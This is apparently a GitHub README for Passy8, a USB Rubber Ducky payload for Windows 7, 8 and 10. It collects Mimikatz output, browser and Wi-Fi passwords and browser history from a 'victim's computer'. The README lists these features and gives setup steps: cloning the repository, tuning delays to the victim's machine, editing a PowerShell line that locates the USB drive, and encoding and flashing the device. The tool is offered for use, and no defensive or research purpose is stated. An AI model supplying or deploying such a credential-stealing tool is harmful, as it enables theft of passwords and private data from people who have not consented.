# Passy8
A Multi Passworld Payload For Windows 7-8 and 10
_______________________________________________________________
## Features

### Windows 8
- Mimikatz Script
- Browser Password (Norsoft)
- Wifi Password (Norsoft)
- Browser History (Norsoft)
- More Coming

### Windows 10
- M̶i̶m̶i̶K̶a̶t̶z̶
- Browser Password (Norsoft)
- Wifi Password (Norsoft)
- Browser History (Norsoft)
- More Coming

________________________________________________________________
## Setup
#
#
Download the file either with git clone or zip
```bash
git clone https://github.com/DeDogeGod/Passy8.git
```
Open the Passy8.txt or Passy10.txt in your favorite text editor or https://ducktoolkit.com/encoder/ and change the delays to fit your victims computer. Don't forget to change the D in
```powershell
STRING $usbPath = GET-WMIObject Win32_Volume | ? { $_.label -eq 'D' } | select name
```
It should be commented. You can encode by,
```bash
ducktools.py -e -l gb /path/to/duck_text.txt /path/to/output.bin
```
or use ttps://ducktoolkit.com/encoder/
to encode.
You can flash your ducky with twin duck by downloading https://github.com/hak5darren/USB-Rubber-Ducky.git and doing,
```bash
apt-get install dfu-programmer
sudo ./setup.py or python setup.py
sudo duck-flasher
4
1 or 2 or 3
```
or you can use a diffrent usb.
Copy and paste the programs onto the root (the main menu) of the usb or ducky. 
The ducky flasher will work on windows with cdwin and stuff but it is better on osx and linux since you need dependencies.

